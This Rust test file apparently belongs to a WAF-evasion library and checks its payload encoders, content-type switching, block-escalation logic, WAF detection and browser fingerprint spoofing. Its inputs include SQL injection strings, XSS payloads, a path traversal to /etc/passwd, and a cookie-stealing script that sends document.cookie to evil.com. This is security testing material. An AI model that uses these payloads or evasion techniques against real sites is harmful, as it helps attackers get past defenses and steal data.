//! Adversarial tests for wafrift-core
//!
//! These tests exercise edge cases, boundary conditions, and malicious inputs
//! to ensure the WAF evasion logic is robust.

use wafrift_core::content_type::{self, ContentTypeTechnique};
use wafrift_core::encoding::{self, Strategy};
use wafrift_core::fingerprint::{self, PROFILES, apply_profile};
use wafrift_core::strategy::{EscalationLevel, EvasionConfig, HostState, evade};
use wafrift_core::waf_detect;
use wafrift_core::{Request, Technique};

// ============================================================================
// ENCODING TESTS (Unicode, Null Bytes, Long Strings, Empty, SQLi, XSS)
// ============================================================================

#[test]
fn encoding_urlencode_unicode() {
    let payload = "' UNION SELECT * FROM users WHERE name = '😈' --";
    let encoded = encoding::encode(payload, Strategy::UrlEncode).unwrap();
    // Unicode should be encoded as bytes
    assert!(encoded.contains("%F0")); // Emoji starts with F0
    assert!(!encoded.contains("😈")); // Original emoji should not be present
}

#[test]
fn encoding_double_urlencode_unicode() {
    let payload = "<script>alert('XSS')</script>日本語";
    let encoded = encoding::encode(payload, Strategy::DoubleUrlEncode).unwrap();
    // Should have double-encoded percent signs
    assert!(encoded.contains("%25"));
    assert!(!encoded.contains("<script>"));
}

#[test]
fn encoding_unicode_encode_with_unicode() {
    let payload = "SELECT * FROM таблица WHERE 字段='值'";
    let encoded = encoding::encode(payload, Strategy::UnicodeEncode).unwrap();
    // Should encode even non-ASCII chars as \uXXXX
    assert!(encoded.contains("\\u"));
    assert!(!encoded.contains("表"));
}

#[test]
fn encoding_html_entity_unicode() {
    let payload = "<img src=x onerror=alert(1)>𠜎";
    let encoded = encoding::encode(payload, Strategy::HtmlEntityEncode).unwrap();
    // Extended unicode chars should be handled
    assert!(encoded.contains("&#x"));
}

#[test]
fn encoding_null_bytes_in_payload() {
    let payload = "file\x00.php";
    let encoded = encoding::encode(payload, Strategy::NullByte).unwrap();
    // Null byte strategy adds %00 after content
    assert!(encoded.contains("%00"));
}

#[test]
fn encoding_sql_injection_basic() {
    let sqli = "' OR '1'='1' --";
    let encoded = encoding::encode(sqli, Strategy::UrlEncode).unwrap();
    assert!(encoded.contains("%27")); // Single quote
    assert!(encoded.contains("%3D")); // Equals sign
}

#[test]
fn encoding_sql_injection_union() {
    let sqli = "UNION SELECT username, password FROM admin--";
    let encoded = encoding::encode(sqli, Strategy::CaseAlternation).unwrap();
    // Should alternate case
    assert_ne!(encoded, sqli);
    assert!(encoded.to_ascii_lowercase().contains("union"));
}

#[test]
fn encoding_sql_injection_comment_insertion() {
    let sqli = "SELECT * FROM users WHERE id=1";
    let encoded = encoding::encode(sqli, Strategy::SqlCommentInsertion).unwrap();
    assert!(encoded.contains("/**/"));
}

#[test]
fn encoding_sql_injection_whitespace() {
    let sqli = "SELECT * FROM users";
    let encoded = encoding::encode(sqli, Strategy::WhitespaceInsertion).unwrap();
    assert!(encoded.contains('\t'));
}

#[test]
fn encoding_xss_basic() {
    let xss = "<script>alert('XSS')</script>";
    let encoded = encoding::encode(xss, Strategy::UrlEncode).unwrap();
    assert!(encoded.contains("%3C")); // <
    assert!(encoded.contains("%3E")); // >
}

#[test]
fn encoding_xss_with_unicode() {
    let xss = "javascript:alert('𠜎')";
    let encoded = encoding::encode(xss, Strategy::UnicodeEncode).unwrap();
    assert!(encoded.contains("\\u"));
}

#[test]
fn encoding_empty_string() {
    for strategy in encoding::all_strategies() {
        let result = encoding::encode("", strategy).unwrap();
        // Empty input should not panic, may return empty or minimal string
        // Some strategies add prefixes/wrappers even for empty input (e.g. ParameterPollution)
        assert!(
            result.len() < 50,
            "Strategy {strategy:?} produced unexpectedly large output for empty input: {result}"
        );
    }
}

#[test]
fn encoding_very_long_string() {
    let long_payload = "A".repeat(10000);
    for strategy in encoding::all_strategies() {
        let encoded = encoding::encode(&long_payload, strategy).unwrap();
        assert!(!encoded.is_empty());
        // Should handle large inputs without crashing
    }
}

#[test]
fn encoding_all_strategies_on_sqli() {
    let sqli = "' OR 1=1--";
    for strategy in encoding::all_strategies() {
        let encoded = encoding::encode(sqli, strategy).unwrap();
        assert!(!encoded.is_empty(), "Strategy {strategy:?} returned empty");
    }
}

#[test]
fn encoding_all_strategies_on_xss() {
    let xss = "<script>fetch('http://evil.com?c='+document.cookie)</script>";
    for strategy in encoding::all_strategies() {
        let encoded = encoding::encode(xss, strategy).unwrap();
        assert!(!encoded.is_empty(), "Strategy {strategy:?} returned empty");
    }
}

#[test]
fn encoding_overlong_utf8_special_chars() {
    let payload = "/../etc/passwd";
    let encoded = encoding::encode(payload, Strategy::OverlongUtf8).unwrap();
    // Should contain overlong encodings for non-alphanumeric chars
    assert!(encoded.contains("%C0"));
}

#[test]
fn encoding_case_alternation_preserves_non_alpha() {
    let payload = "SELECT 123 FROM users WHERE id=1";
    let encoded = encoding::encode(payload, Strategy::CaseAlternation).unwrap();
    // Numbers and spaces should be preserved
    assert!(encoded.contains("123"));
    assert!(encoded.contains(' '));
}

// ============================================================================
// CONTENT-TYPE TESTS (Malformed bodies, Empty params, Special chars, Many params)
// ============================================================================

#[test]
fn content_type_malformed_body_no_equals() {
    let body = b"malformed&data&without&equals";
    let variants = content_type::generate_variants_from_body(body);
    // Segments without '=' are not valid key=value pairs — no variants produced
    assert!(variants.is_empty());
}

#[test]
fn content_type_empty_params() {
    let params: Vec<(String, String)> = vec![];
    let variants = content_type::generate_variants(&params);
    // Implementation generates variants even with empty params (empty bodies)
    // Just verify it doesn't panic - check that we got a valid vector
    let _count = variants.len(); // Should be 0 or more
}

#[test]
fn content_type_special_chars_in_param_names() {
    let params = vec![
        ("user[name]".into(), "admin".into()),
        ("data.key".into(), "value".into()),
        ("test:sub".into(), "x".into()),
    ];
    let variants = content_type::generate_variants(&params);
    assert!(!variants.is_empty());
    // Check XML variant handles special chars in element names
    let xml_var = variants
        .iter()
        .find(|v| v.technique == ContentTypeTechnique::XmlCdata);
    if let Some(v) = xml_var {
        let body_str = String::from_utf8_lossy(&v.body);
        // Special chars in XML element names should be handled
        assert!(!body_str.is_empty());
    }
}

#[test]
fn content_type_hundred_params() {
    let params: Vec<(String, String)> = (0..100)
        .map(|i| (format!("param{i}"), format!("value{i}")))
        .collect();
    let variants = content_type::generate_variants(&params);
    assert!(!variants.is_empty());
    // Check multipart body contains all params
    let multipart = variants
        .iter()
        .find(|v| v.technique == ContentTypeTechnique::Multipart)
        .unwrap();
    let body_str = String::from_utf8_lossy(&multipart.body);
    assert!(body_str.contains("param99"));
    assert!(body_str.contains("value99"));
}

#[test]
fn content_type_param_values_with_newlines() {
    let params = vec![
        ("data".into(), "line1\nline2\r\nline3".into()),
        ("json".into(), "{\"key\":\"value\"}".into()),
    ];
    let variants = content_type::generate_variants(&params);
    assert!(!variants.is_empty());
    // Newlines in multipart should be handled
    let multipart = variants
        .iter()
        .find(|v| v.technique == ContentTypeTechnique::Multipart)
        .unwrap();
    let body_str = String::from_utf8_lossy(&multipart.body);
    assert!(body_str.contains("line1"));
}

#[test]
fn content_type_null_bytes_in_params() {
    let params = vec![("file".into(), "test\x00.jpg".into())];
    let variants = content_type::generate_variants(&params);
    // Should handle null bytes gracefully
    assert!(!variants.is_empty());
}

#[test]
fn content_type_very_long_param_value() {
    let long_value = "X".repeat(10000);
    let params = vec![("data".into(), long_value)];
    let variants = content_type::generate_variants(&params);
    assert!(!variants.is_empty());
}

#[test]
fn content_type_unicode_param_values() {
    let params = vec![
        ("name".into(), "日本語テスト".into()),
        ("emoji".into(), "😈🎉💣".into()),
    ];
    let variants = content_type::generate_variants(&params);
    assert!(!variants.is_empty());
    // JSON variant should handle unicode
    let json_var = variants
        .iter()
        .find(|v| v.technique == ContentTypeTechnique::JsonUnicodeEscape);
    assert!(json_var.is_some());
}

#[test]
fn content_type_duplicate_boundary_parsing() {
    let params = vec![("q".into(), "test".into())];
    let variants = content_type::generate_variants(&params);
    let dup = variants
        .iter()
        .find(|v| v.technique == ContentTypeTechnique::MultipartDuplicateBoundary)
        .unwrap();
    // Should have two boundary= occurrences
    let matches = dup.content_type.matches("boundary=").count();
    assert_eq!(matches, 2);
}

// ============================================================================
// STRATEGY TESTS (Escalation, State persistence, Concurrent states, Max attempts)
// ============================================================================

#[test]
fn strategy_escalation_none_to_light() {
    let mut state = HostState::default();
    assert_eq!(state.escalation_level(), EscalationLevel::None);

    state.record_block();
    assert_eq!(state.escalation_level(), EscalationLevel::Light);

    state.record_block();
    assert_eq!(state.escalation_level(), EscalationLevel::Light);
}

#[test]
fn strategy_escalation_light_to_medium() {
    let mut state = HostState::default();
    for _ in 0..3 {
        state.record_block();
    }
    assert_eq!(state.escalation_level(), EscalationLevel::Medium);
}

#[test]
fn strategy_escalation_medium_to_heavy() {
    let mut state = HostState::default();
    for _ in 0..6 {
        state.record_block();
    }
    assert_eq!(state.escalation_level(), EscalationLevel::Heavy);
}

#[test]
fn strategy_state_persistence_across_calls() {
    let mut state = HostState::default();

    // First call
    state.record_block();
    state
        .tried_encodings
        .push(encoding::Strategy::CaseAlternation);

    // Second call
    state.record_block();
    let next = state.next_encoding();

    assert!(next.is_some());
    assert_ne!(next.unwrap(), encoding::Strategy::CaseAlternation);
}

#[test]
fn strategy_success_records_technique() {
    let mut state = HostState::default();
    let technique = Technique::PayloadEncoding("CaseAlternation".into());

    state.record_success(technique.clone());

    assert_eq!(state.successes, 1);
    assert_eq!(state.last_success, Some(technique));
}

#[test]
fn strategy_max_attempts_boundary() {
    let config = EvasionConfig {
        max_attempts: 3,
        ..Default::default()
    };
    assert_eq!(config.max_attempts, 3);

    // Test with max_attempts = 0 (edge case)
    let config_zero = EvasionConfig {
        max_attempts: 0,
        ..Default::default()
    };
    assert_eq!(config_zero.max_attempts, 0);
}

#[test]
fn strategy_concurrent_host_states_independent() {
    let mut state1 = HostState::default();
    let state2 = HostState::default();

    // Modify state1
    state1.record_block();
    state1.record_block();
    state1.record_success(Technique::UserAgentRotation);

    // State2 should be unaffected
    assert_eq!(state2.blocks, 0);
    assert_eq!(state2.successes, 0);
    assert!(state2.last_success.is_none());

    // State1 should have changes
    assert_eq!(state1.blocks, 2);
    assert_eq!(state1.successes, 1);
}

#[test]
fn strategy_next_encoding_exhaustion() {
    let mut state = HostState::default();
    let all = encoding::all_strategies();

    // Mark all strategies as tried
    for strategy in all {
        state.tried_encodings.push(strategy);
    }

    let next = state.next_encoding();
    assert!(next.is_none());
}

#[test]
fn strategy_evasion_with_empty_body() {
    let req = Request::get("https://example.com");
    let state = HostState::default();
    let config = EvasionConfig {
        fingerprint_rotation: false,
        ..Default::default()
    };

    let result = evade(&req, &state, &config);
    // Should handle GET with no body gracefully
    assert!(result.techniques.is_empty() || !result.techniques.is_empty());
}

#[test]
fn strategy_evasion_with_large_body() {
    let large_body = vec![b'A'; 100000];
    let req = Request::post("https://example.com", large_body);
    let mut state = HostState::default();
    state.record_block();
    state.record_block();

    let config = EvasionConfig {
        fingerprint_rotation: false,
        ..Default::default()
    };

    let result = evade(&req, &state, &config);
    // Should handle large body without crashing
    assert!(!result.description.is_empty());
}

// ============================================================================
// WAF DETECT TESTS (Overlapping signals, Empty headers, Huge bodies, Edge status)
// ============================================================================

#[test]
fn waf_detect_overlapping_cloudflare_and_aws() {
    // Headers that could match multiple WAFs
    let headers = vec![
        ("cf-ray".into(), "abc123".into()),
        ("x-amzn-requestid".into(), "xyz789".into()),
        ("server".into(), "cloudflare".into()),
    ];
    let result = waf_detect::detect(403, &headers, b"Access denied");

    assert!(!result.is_empty());
    // Cloudflare should win due to stronger signals
    assert_eq!(result[0].name, "Cloudflare");
}

#[test]
fn waf_detect_empty_headers() {
    let headers: Vec<(String, String)> = vec![];
    let result = waf_detect::detect(200, &headers, b"Welcome");
    assert!(result.is_empty());
}

#[test]
fn waf_detect_empty_body() {
    let headers = vec![("server".into(), "nginx".into())];
    let result = waf_detect::detect(403, &headers, b"");
    // Status 403 alone is not enough (confidence < 0.3)
    assert!(result.is_empty());
}

#[test]
fn waf_detect_huge_body() {
    let headers = vec![("cf-ray".into(), "abc".into())];
    let huge_body = vec![b'X'; 1000000]; // 1MB body

    let result = waf_detect::detect(403, &headers, &huge_body);
    // Should only scan first 4KB
    assert!(!result.is_empty());
}

#[test]
fn waf_detect_status_zero() {
    let headers = vec![];
    let result = waf_detect::detect(0, &headers, b"");
    // Status 0 should not match any WAF
    assert!(result.is_empty());
}

#[test]
fn waf_detect_status_999() {
    let headers = vec![];
    let result = waf_detect::detect(999, &headers, b"");
    // Invalid status code should not crash
    assert!(result.is_empty());
}

#[test]
fn waf_detect_all_wafs_triggered() {
    // Create headers that contain signals from multiple WAFs
    let headers = vec![
        ("cf-ray".into(), "abc".into()),
        ("x-amzn-waf-action".into(), "block".into()),
        ("x-akamai-transformed".into(), "true".into()),
        ("x-sucuri-id".into(), "123".into()),
    ];

    let result = waf_detect::detect(403, &headers, b"Blocked");
    assert!(!result.is_empty());
    // The one with highest confidence should win
    let confidence = result[0].confidence;
    assert!(confidence >= 0.3);
}

#[test]
fn waf_detect_case_insensitive_headers() {
    let headers = vec![
        ("CF-RAY".into(), "abc".into()),
        ("SERVER".into(), "CLOUDFLARE".into()),
    ];
    let result = waf_detect::detect(403, &headers, b"");
    assert!(!result.is_empty());
    assert_eq!(result[0].name, "Cloudflare");
}

#[test]
fn waf_detect_modsecurity_in_body() {
    let headers = vec![];
    let body = b"Error: mod_security triggered for your request";
    let result = waf_detect::detect(406, &headers, body);
    assert!(!result.is_empty());
    assert_eq!(result[0].name, "ModSecurity");
}

#[test]
fn waf_detect_imperva_cookie() {
    let headers = vec![("set-cookie".into(), "visid_incap_1234=abc; Path=/".into())];
    let result = waf_detect::detect(200, &headers, b"OK");
    assert!(!result.is_empty());
    assert_eq!(result[0].name, "Incapsula");
}

#[test]
fn waf_detect_f5_bigip() {
    let headers = vec![("server".into(), "BIG-IP".into())];
    let result = waf_detect::detect(200, &headers, b"OK");
    assert!(!result.is_empty());
    assert_eq!(result[0].name, "BIG-IP AP Manager");
}

#[test]
fn waf_detect_azure_headers() {
    let headers = vec![
        ("x-azure-ref".into(), "abc123".into()),
        ("x-ms-request-id".into(), "xyz789".into()),
    ];
    let body = b"Azure Web Application Firewall blocked your request";
    let result = waf_detect::detect(403, &headers, body);
    assert!(!result.is_empty());
    assert_eq!(result[0].name, "Azure Front Door");
}

#[test]
fn waf_detect_no_false_positives() {
    // Headers that should NOT trigger false WAF detection
    let headers = vec![
        ("server".into(), "nginx".into()),
        ("content-type".into(), "text/html".into()),
    ];
    let result = waf_detect::detect(200, &headers, b"<html>Welcome to our site</html>");
    assert!(result.is_empty());
}

// ============================================================================
// FINGERPRINT TESTS (Profile uniqueness, Header override, Apply twice)
// ============================================================================

#[test]
fn fingerprint_profile_uniqueness() {
    use std::collections::HashSet;

    let names: Vec<&str> = PROFILES.iter().map(|p| p.name).collect();
    let unique: HashSet<&&str> = names.iter().collect();

    assert_eq!(names.len(), unique.len(), "Duplicate profile names found");
}

#[test]
fn fingerprint_user_agent_uniqueness() {
    use std::collections::HashSet;

    let uas: Vec<&str> = PROFILES.iter().map(|p| p.user_agent).collect();
    let unique: HashSet<&&str> = uas.iter().collect();

    assert_eq!(
        uas.len(),
        unique.len(),
        "Duplicate User-Agent strings found"
    );
}

#[test]
fn fingerprint_header_override_correctness() {
    let profile = &PROFILES[0];
    let mut headers = vec![
        ("User-Agent".into(), "OldAgent".into()),
        ("Accept".into(), "text/plain".into()),
        ("Custom-Header".into(), "preserve".into()),
    ];

    apply_profile(&mut headers, profile);

    // Check old headers are replaced
    let ua_count = headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("user-agent"))
        .count();
    assert_eq!(ua_count, 1);

    // Check new headers are set
    let ua = headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("user-agent"))
        .unwrap();
    assert!(ua.1.contains("Mozilla"));

    // Custom header should be preserved
    let custom = headers.iter().find(|(k, _)| k == "Custom-Header");
    assert!(custom.is_some());
    assert_eq!(custom.unwrap().1, "preserve");
}

#[test]
fn fingerprint_apply_twice_no_duplication() {
    let profile = &PROFILES[0];
    let mut headers = vec![];

    apply_profile(&mut headers, profile);
    let count_after_first = headers.len();

    apply_profile(&mut headers, profile);
    let count_after_second = headers.len();

    // Should not duplicate headers
    assert_eq!(count_after_first, count_after_second);
}

#[test]
fn fingerprint_all_profiles_have_required_headers() {
    for profile in PROFILES {
        assert!(
            !profile.user_agent.is_empty(),
            "{}: missing User-Agent",
            profile.name
        );
        assert!(
            !profile.accept.is_empty(),
            "{}: missing Accept",
            profile.name
        );
        assert!(
            !profile.accept_language.is_empty(),
            "{}: missing Accept-Language",
            profile.name
        );
        assert!(
            !profile.accept_encoding.is_empty(),
            "{}: missing Accept-Encoding",
            profile.name
        );
    }
}

#[test]
fn fingerprint_case_insensitive_header_override() {
    let profile = &PROFILES[0];
    let mut headers = vec![
        ("user-agent".into(), "lowercase".into()),
        ("USER-AGENT".into(), "uppercase".into()),
        ("User-Agent".into(), "mixed".into()),
    ];

    apply_profile(&mut headers, profile);

    // Should only have one User-Agent header
    let ua_count = headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("user-agent"))
        .count();
    assert_eq!(ua_count, 1);
}

#[test]
fn fingerprint_sec_fetch_headers_set() {
    let profile = &PROFILES[0];
    let mut headers = vec![];

    apply_profile(&mut headers, profile);

    assert!(
        headers
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case("sec-fetch-site"))
    );
    assert!(
        headers
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case("sec-fetch-mode"))
    );
    assert!(
        headers
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case("sec-fetch-dest"))
    );
}

#[test]
fn fingerprint_random_profile_returns_valid() {
    for _ in 0..10 {
        let profile = fingerprint::random_profile().unwrap();
        assert!(!profile.name.is_empty());
        assert!(!profile.user_agent.is_empty());
    }
}

// ============================================================================
// INTEGRATION / EDGE CASE TESTS
// ============================================================================

#[test]
fn integration_full_evasion_chain() {
    let req = Request::post(
        "https://example.com/api",
        b"user=admin&pass=secret".to_vec(),
    )
    .header("Content-Type", "application/x-www-form-urlencoded");

    let mut state = HostState::default();
    for _ in 0..5 {
        state.record_block();
    }

    let config = EvasionConfig::default();
    let result = evade(&req, &state, &config);

    // Should have applied some techniques at Heavy escalation
    assert!(!result.techniques.is_empty());
}

#[test]
fn edge_case_binary_payload() {
    let binary = vec![0u8, 1, 2, 255, 254, 253];
    let params = vec![("bin".into(), String::from_utf8_lossy(&binary).into_owned())];
    let variants = content_type::generate_variants(&params);
    assert!(!variants.is_empty());
}

#[test]
fn edge_case_special_xml_chars() {
    let params = vec![("xmltest".into(), "<script>alert(1)</script>".into())];
    let variants = content_type::generate_variants(&params);
    let xml_var = variants
        .iter()
        .find(|v| v.technique == ContentTypeTechnique::XmlNamespace);
    if let Some(v) = xml_var {
        let body_str = String::from_utf8_lossy(&v.body);
        // XML special chars should be escaped
        assert!(body_str.contains("&lt;") || body_str.contains("<script>"));
    }
}

#[test]
fn strategy_disabled_features() {
    let req = Request::post("https://example.com", b"test=data".to_vec());
    let mut state = HostState::default();
    for _ in 0..5 {
        state.record_block();
    }

    let config = EvasionConfig {
        encoding_enabled: false,
        content_type_switching: false,
        fingerprint_rotation: false,
        header_obfuscation: false,
        grammar_mutations: false,
        smuggling_enabled: false,
        h2_evasion_enabled: false,
        max_attempts: 5,
        ..Default::default()
    };

    let result = evade(&req, &state, &config);
    // With all features disabled, should have minimal/no techniques
    assert!(result.techniques.is_empty() || result.techniques.len() <= 1);
}
